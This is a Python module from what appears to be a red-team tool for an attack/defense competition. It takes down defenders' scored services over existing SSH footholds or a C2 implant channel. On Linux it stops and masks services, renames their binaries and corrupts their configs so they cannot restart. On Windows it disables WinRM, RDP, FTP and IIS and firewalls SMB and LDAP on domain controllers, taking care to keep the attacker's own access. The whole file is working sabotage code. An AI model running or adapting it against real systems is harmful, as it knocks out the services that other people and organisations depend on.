"""takedown — stop a scored service with a ladder-gated mechanism; every mechanism is a MOVE or a COPY, never a delete."""

import re
import shlex

from ..errors import PolicyError
from .base import Effect, Result, can_root, register, root_cmd

_UNIT_RE = re.compile(r"^[a-zA-Z0-9@._\\-]+$")

HARD_MODES = ("stop_rename", "stop_break_config", "stop_rename_config")
TAKEDOWN_MODES = ("stop", "stop_mask") + HARD_MODES

BIN_SUFFIX = ".tlaloc-off"
CONF_SUFFIX = ".tlaloc-bak"

# Config paths cannot be derived the way ExecStart is, so scored services are
# listed; unknown services degrade to rename-only.
SERVICE_CONFS = {
    "nginx": ("/etc/nginx/nginx.conf",),
    "apache2": ("/etc/apache2/apache2.conf",),
    "httpd": ("/etc/httpd/conf/httpd.conf",),
    "named": ("/etc/bind/named.conf",),
    "bind9": ("/etc/bind/named.conf",),
    "vsftpd": ("/etc/vsftpd.conf", "/etc/vsftpd/vsftpd.conf"),
    "mariadb": ("/etc/mysql/mariadb.conf.d/50-server.cnf", "/etc/my.cnf"),
    "mysql": ("/etc/mysql/my.cnf", "/etc/my.cnf"),
    "postgresql": ("/etc/postgresql/*/main/postgresql.conf",),
    "dovecot": ("/etc/dovecot/dovecot.conf",),
    "postfix": ("/etc/postfix/main.cf",),
    "lighttpd": ("/etc/lighttpd/lighttpd.conf",),
    "redis": ("/etc/redis/redis.conf",),
    "redis-server": ("/etc/redis/redis.conf",),
    "smbd": ("/etc/samba/smb.conf",),
    "splunk": ("/opt/splunk/etc/splunk-launch.conf",),
}

# Intel carries package slugs, not installed unit names (apache -> apache2):
# first active alias wins, else first with a unit file.
UNIT_ALIASES = {
    "apache": ("apache2", "httpd"),
    "httpd": ("httpd", "apache2"),
    "bind": ("named", "bind9"),
    "mysql": ("mariadb",),
    "mariadb": ("mysql",),
    "exim": ("exim4",),
    # roundcube is an apache vhost, splunk's scored :8000 is lighttpd on this
    # range, and telnet is inetd-based (no telnet.service): they die with the daemon.
    "roundcube": ("apache2", "httpd"),
    "splunk": ("lighttpd", "splunk"),
    "telnet": ("openbsd-inetd", "inetutils-inetd", "xinetd", "telnetd"),
    "telnet-service": ("openbsd-inetd", "inetutils-inetd", "xinetd", "telnetd"),
}

_SSH_UNITS = ("ssh", "sshd", "ssh.service", "sshd.service")

_PORT_LISTEN_CHECK = ("if (Get-NetTCPConnection -LocalPort %d -State Listen "
                      "-ErrorAction SilentlyContinue) {'LISTENING'} else {'CLOSED'}")

# Slugs come from nakon, matched as substrings; first match wins, so entry
# order is load-bearing.
WINDOWS_EFFECTS = [
    ("winrm", ("Stop-Service WinRM -Force -ErrorAction SilentlyContinue; "
               "Set-Service WinRM -StartupType Disabled",
               _PORT_LISTEN_CHECK % 5985, "winrm", "CLOSED")),
    # :445 is held by the kernel srv2 driver and survives a LanmanServer stop — block instead.
    ("smb", ("Remove-NetFirewallRule -Name tlaloc-impact -ErrorAction SilentlyContinue; "
             "New-NetFirewallRule -Name tlaloc-impact -DisplayName 'blk smb' "
             "-Direction Inbound -LocalPort 445 -Protocol TCP -Action Block "
             "-ErrorAction Stop",
             "(Get-NetFirewallRule -Name tlaloc-impact).Enabled",
             "lanmanserver(smb)", "True")),
    ("rdp", ("Set-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' "
             "-Name fDenyTSConnections -Value 1; "
             "Stop-Service UmRdpService -Force -ErrorAction SilentlyContinue; "
             "Stop-Service TermService -Force -ErrorAction SilentlyContinue; "
             "Set-NetFirewallRule -Name RemoteDesktop-UserMode-In-TCP "
             "-Enabled False -ErrorAction SilentlyContinue",
             "(Get-NetFirewallRule -Name RemoteDesktop-UserMode-In-TCP).Enabled",
             "rdp", "False")),
    ("ftp", ("Stop-Service ftpsvc -Force -ErrorAction SilentlyContinue; "
             "Set-Service ftpsvc -StartupType Disabled",
             "(Get-Service ftpsvc).Status", "ftp(ftpsvc)", "Stopped")),
    # http.sys keeps :80 bound (503) after W3SVC stops, so the postcheck is service status.
    ("iis", ("Stop-Service W3SVC -Force -ErrorAction SilentlyContinue; "
             "Stop-Service WAS -Force -ErrorAction SilentlyContinue",
             "(Get-Service W3SVC).Status", "iis(w3svc)", "Stopped")),
    # NEVER stop NTDS: on a DC the Administrator authenticates against the AD
    # database it serves — stopping it locks out our own foothold. Block :389.
    ("adds", ("Set-NetFirewallProfile -All -Enabled True -ErrorAction SilentlyContinue; "
              "Remove-NetFirewallRule -Name tlaloc-ldap -ErrorAction SilentlyContinue; "
              "New-NetFirewallRule -Name tlaloc-ldap -DisplayName 'blk ldap' "
              "-Direction Inbound -LocalPort 389 -Protocol TCP -Action Block "
              "-ErrorAction Stop",
              "(Get-NetFirewallRule -Name tlaloc-ldap).Enabled", "adds(ldap)", "True")),
    ("ldap", ("Set-NetFirewallProfile -All -Enabled True -ErrorAction SilentlyContinue; "
              "Remove-NetFirewallRule -Name tlaloc-ldap -ErrorAction SilentlyContinue; "
              "New-NetFirewallRule -Name tlaloc-ldap -DisplayName 'blk ldap' "
              "-Direction Inbound -LocalPort 389 -Protocol TCP -Action Block "
              "-ErrorAction Stop",
              "(Get-NetFirewallRule -Name tlaloc-ldap).Enabled", "adds(ldap)", "True")),
]


def windows_admin(fh):
    """Windows Administrator is admin-equivalent: no privesc exists for the impact paths."""
    return bool(can_root(fh) or str((fh or {}).get("user", "")).lower()
                in ("administrator", "admin"))


def unit_alias_script(unit):
    base = unit.removesuffix(".service")
    cands = " ".join([base, *UNIT_ALIASES.get(base, ())])
    return (f"for u in {cands}; do systemctl is-active $u.service >/dev/null 2>&1 "
            f"&& {{ echo $u; exit 0; }}; done; "
            f"for u in {cands}; do systemctl cat $u.service >/dev/null 2>&1 "
            f"&& {{ echo $u; exit 0; }}; done; exit 1")


@register
class Takedown(Effect):
    id = "takedown"
    name = "stop/mask a scored service"
    description = ("Take a scored systemd service (or a scored Windows service/slug) "
                   "down on a box where we have a root/admin path. mode=stop is "
                   "plain; stop_mask forces blue to unmask before restart; "
                   "stop_rename / stop_break_config / stop_rename_config leave the "
                   "unit unable to start until blue undoes specific damage. Only the "
                   "mechanisms the current ladder tier unlocks are accepted. For a "
                   "scored pin that is a bare port check use block_port instead.")
    params = {
        "ip": {"type": "str", "required": True, "desc": "target box"},
        "service": {"type": "str", "required": True,
                    "desc": "systemd unit or package slug (resolved on the box)"},
        "mode": {"type": "enum", "choices": list(TAKEDOWN_MODES),
                 "desc": "takedown mechanism (ladder-gated)"},
        "allow_ssh": {"type": "str",
                      "desc": "'true' to allow stopping sshd (off by default: "
                              "that is our own access path)"},
    }
    tags = frozenset({"pressure", "impacty"})
    needs = {"foothold": True, "root": False, "c2": False, "os": "any"}
    failure_scope = "service"

    def check(self, ctx, params):
        super().check(ctx, params)
        ip, unit = params["ip"], params["service"]
        fh = ctx.world.foothold(ip)
        windows = bool(fh and fh.get("windows"))
        if windows:
            if not windows_admin(fh):
                raise PolicyError(f"takedown needs an Administrator foothold on {ip}")
        elif not can_root(fh):
            raise PolicyError(f"takedown needs a root path on {ip} — escalate first")

        base = unit.lower().removesuffix(".service").strip()
        allow_ssh = str(params.get("allow_ssh", "")).lower() == "true"
        if base in ("ssh", "sshd") and not (allow_ssh or ctx.cfg["effects"]["allow_ssh_takedown"]):
            raise PolicyError("refusing to stop ssh — that is our own access path "
                              "(effects.allow_ssh_takedown or allow_ssh=true)")

        mode = params.get("mode") or "stop_mask"
        if windows:
            return                       # windowless mechanisms are not ladder-ranked
        policy = getattr(ctx, "policy", None)
        if policy is not None:
            allowed = policy.allowed_impact_modes()
            if mode not in allowed:
                raise PolicyError(
                    f"takedown mechanism {mode!r} is above the current tier — "
                    f"allowed now: {allowed or 'nothing (observe)'}")
            ok, why = policy.can_impact(ctx.intel.team_of(ip))
            if not ok:
                raise PolicyError(why)
        if ctx.world.failure_count(self.id, ip, unit) >= 2:
            raise PolicyError(f"takedown already failed twice on {ip} {unit} — switch "
                              "target or mechanism")

    def run(self, ctx, params):
        ip, unit = params["ip"], params["service"]
        fh = ctx.world.foothold(ip)
        allow_ssh = str(params.get("allow_ssh", "")).lower() == "true"
        if (unit.lower().removesuffix(".service") in ("ssh", "sshd")
                and not (allow_ssh or ctx.cfg["effects"]["allow_ssh_takedown"])):
            return Result(False, "refusing to stop ssh — our own access path")
        if fh.get("windows"):
            return self._windows(ctx, ip, fh, unit)
        if not _UNIT_RE.match(unit):
            return Result(False, f"invalid unit name: {unit!r}")

        mode = params.get("mode") or "stop_mask"
        unit = self._resolve_unit(ctx, ip, fh, unit)
        if mode in HARD_MODES:
            return self._hard_linux(ctx, ip, fh, unit, mode)

        script = f"systemctl stop {unit}"
        if mode == "stop_mask":
            script += f" && systemctl mask {unit}"
        rc, out, err = ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
                                   root_cmd(script, fh), timeout=60,
                                   key_path=fh.get("key_path"))
        if rc != 0:
            return Result(False, f"systemctl rc={rc}: {(err or out).strip()[:200]}")
        active = self._is_active(ctx, ip, fh, unit)
        if active:
            return Result(False, f"{unit} still active on {ip} after stop")
        return Result(True, f"{unit} is DOWN on {ip} ({mode})",
                      impact={"ip": ip, "service": unit, "mode": mode},
                      restore=restore_recipe(unit, mode))

    def _is_active(self, ctx, ip, fh, unit):
        rc, out, _ = ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
                                 root_cmd(f"systemctl is-active {unit}", fh),
                                 timeout=30, key_path=fh.get("key_path"))
        return (out or "").strip().splitlines()[-1:] == ["active"]

    def _resolve_unit(self, ctx, ip, fh, unit):
        rc, out, _ = ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
                                 root_cmd(unit_alias_script(unit), fh), timeout=30,
                                 key_path=fh.get("key_path"))
        if rc != 0 or not (out or "").strip():
            return unit
        return out.strip().splitlines()[-1]

    def _hard_linux(self, ctx, ip, fh, unit, mode):
        base = unit.removesuffix(".service")
        want_rename = mode in ("stop_rename", "stop_rename_config")
        want_conf = mode in ("stop_break_config", "stop_rename_config")
        confs = list(SERVICE_CONFS.get(base, ())) + [f"/etc/{base}/{base}.conf"]
        lines = [
            "set -u",
            f"U={shlex.quote(unit)}",
            "BIN=$(systemctl show -p ExecStart --value \"$U\" 2>/dev/null "
            "| tr ' ' '\\n' | sed -n 's/^path=//p' | head -1)",
            "[ -n \"$BIN\" ] || BIN=$(systemctl show -p ExecStart --value \"$U\" "
            "2>/dev/null | awk '{print $1}')",
            "CONF=\"\"",
        ]
        globs = " ".join(shlex.quote(x) for x in confs)
        lines.append(f"for g in {globs}; do for f in $g; do "
                     f"[ -f \"$f\" ] && {{ CONF=\"$f\"; break; }}; done; "
                     f"[ -n \"$CONF\" ] && break; done")
        lines += ["systemctl stop \"$U\" >/dev/null 2>&1 || true", "OUT=\"\""]
        if want_rename:
            lines.append(f"[ -n \"$BIN\" ] && [ -x \"$BIN\" ] && "
                         f"mv -f \"$BIN\" \"$BIN{BIN_SUFFIX}\" && OUT=\"$OUT RENAME:$BIN\"")
        if want_conf:
            lines.append(f"[ -n \"$CONF\" ] && cp -a \"$CONF\" \"$CONF{CONF_SUFFIX}\" && "
                         f"printf '\\ntlaloc_config_break\\n' >> \"$CONF\" "
                         f"&& OUT=\"$OUT CONF:$CONF\"")
        lines += [
            # Proof: a start must fail on its own, or the impact is a lie.
            "systemctl unmask \"$U\" >/dev/null 2>&1 || true",
            "systemctl start \"$U\" >/dev/null 2>&1 || true",
            "STATE=$(systemctl is-active \"$U\" 2>/dev/null)",
            "echo \"TLALOC_HARD$OUT STATE=$STATE\"",
        ]
        rc, out, err = ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
                                   root_cmd("\n".join(lines), fh), timeout=90,
                                   key_path=fh.get("key_path"))
        text = out or ""
        if "TLALOC_HARD" not in text:
            return Result(False, f"hard takedown rc={rc}: {(err or text).strip()[:200]}")

        state_match = re.search(r"STATE=(\S+)", text)
        state = state_match.group(1) if state_match else "unknown"
        renamed = re.search(r"RENAME:(\S+)", text)
        conf = re.search(r"CONF:(\S+)", text)
        if state == "active":
            # The damage did not hold — mask instead of claiming a takedown.
            ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
                        root_cmd(f"systemctl stop {unit}; systemctl mask {unit}", fh),
                        timeout=60, key_path=fh.get("key_path"))
            return Result(False, f"{mode} did not hold on {unit} ({ip}) — it still "
                                 "starts; masked instead (mask is not the requested mode)")
        if not renamed and not conf:
            return Result(False, f"{mode} on {unit} ({ip}): nothing to mutate "
                                 "(no binary/config found)")

        detail = mode
        if renamed:
            detail += f"; binary {renamed.group(1)} moved to {renamed.group(1)}{BIN_SUFFIX}"
        if conf:
            detail += (f"; config {conf.group(1)} broken "
                       f"(backup {conf.group(1)}{CONF_SUFFIX})")
        ctx.world.note(ip, f"impact: {detail}")
        return Result(True, f"{unit} is DOWN on {ip} ({detail})",
                      impact={"ip": ip, "service": unit, "mode": mode, "detail": detail},
                      restore=restore_recipe(unit, mode,
                                             renamed=renamed.group(1) if renamed else None,
                                             conf=conf.group(1) if conf else None))

    def _windows_via_channel(self, ctx, ip, stop, check, label, expect):
        c2 = getattr(ctx, "c2", None)
        if c2 is None:
            return None
        from .implant_channel import box_id_for
        key = box_id_for(ctx, ip)
        try:
            outcome = c2.task(key, stop, timeout=120)
        except Exception:
            return None
        if not outcome.get("task_id") or not outcome.get("ok"):
            return None
        try:
            status = c2.task(key, check, timeout=120)
        except Exception:
            return None
        output = str(status.get("output") or "").strip()
        if expect not in output:
            return Result(False, f"{label} still reporting {output[:80]!r} on {ip} "
                                 f"(via C2)")
        return Result(True, f"{label} is DOWN on {ip} (stop_disable via C2)",
                      impact={"ip": ip, "service": label, "mode": "stop_disable"},
                      restore=windows_restore_recipe(label))

    def _windows(self, ctx, ip, fh, unit):
        key = unit.lower().removesuffix(".service").strip()
        if key in ("ssh", "sshd"):
            return Result(False, "refusing to stop sshd — our own access path")
        found = next((e for slug, e in WINDOWS_EFFECTS if slug in key), None)
        if found is None:
            found = (f"Stop-Service '{unit}' -ErrorAction Stop; "
                     f"Set-Service '{unit}' -StartupType Disabled",
                     f"(Get-Service '{unit}').Status", unit, "Stopped")
        stop, check, label, expect = found
        try:
            rc, out, err = ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "", stop,
                                       timeout=60, windows=True, key_path=fh.get("key_path"))
        except Exception:
            # The DC's built-in Administrator can be disabled by the AD DS promotion,
            # so the SSH login is closed while the C2 channel is live (live: cde-2026).
            via = self._windows_via_channel(ctx, ip, stop, check, label, expect)
            if via is not None:
                return via
            raise
        if rc != 0:
            via = self._windows_via_channel(ctx, ip, stop, check, label, expect)
            if via is not None:
                return via
            return Result(False, f"powershell rc={rc}: {(err or out).strip()[:200]}")
        rc, out, _ = ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "", check,
                                 timeout=30, windows=True, key_path=fh.get("key_path"))
        status = (out or "").strip().splitlines()[-1] if (out or "").strip() else ""
        if expect not in status:
            return Result(False, f"{label} still reporting {status!r} on {ip}")
        return Result(True, f"{label} is DOWN on {ip} (stop_disable)",
                      impact={"ip": ip, "service": label, "mode": "stop_disable"},
                      restore=windows_restore_recipe(label))


def restore_recipe(unit, mode, renamed=None, conf=None):
    steps = []
    if mode in ("stop", "stop_mask"):
        steps.append(f"systemctl unmask {unit}; systemctl start {unit}")
    else:
        if renamed or mode in ("stop_rename", "stop_rename_config"):
            target = renamed or f"<ExecStart path of {unit}>"
            steps.append(f"mv -f {target}{BIN_SUFFIX} {target}")
        if conf or mode in ("stop_break_config", "stop_rename_config"):
            cfg = conf or "<config path>"
            steps.append(f"cp -a {cfg}{CONF_SUFFIX} {cfg} && rm -f {cfg}{CONF_SUFFIX}")
        steps.append(f"systemctl unmask {unit}; systemctl start {unit}")
    return {"recipe": steps, "secrets": None}


WINDOWS_RESTORES = {
    "winrm": "Set-Service WinRM -StartupType Automatic; Start-Service WinRM",
    "lanmanserver(smb)": ("Remove-NetFirewallRule -Name tlaloc-impact "
                          "-ErrorAction SilentlyContinue; Set-Service LanmanServer "
                          "-StartupType Automatic; Start-Service LanmanServer"),
    "rdp": ("Set-NetFirewallRule -Name RemoteDesktop-UserMode-In-TCP -Enabled True; "
            "Set-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' "
            "-Name fDenyTSConnections -Value 0; Start-Service TermService"),
    "ftp(ftpsvc)": ("Set-Service ftpsvc -StartupType Automatic -ErrorAction "
                    "SilentlyContinue; Start-Service ftpsvc"),
    "iis(w3svc)": "Start-Service WAS; Start-Service W3SVC",
    "adds(ldap)": "Remove-NetFirewallRule -Name tlaloc-ldap -ErrorAction SilentlyContinue",
}


def windows_restore_recipe(label):
    step = WINDOWS_RESTORES.get((label or "").lower())
    if step is None:
        return {"recipe": [f"Set-Service '{label}' -StartupType Automatic; "
                           f"Start-Service '{label}'"], "secrets": None}
    return {"recipe": [step], "secrets": None}
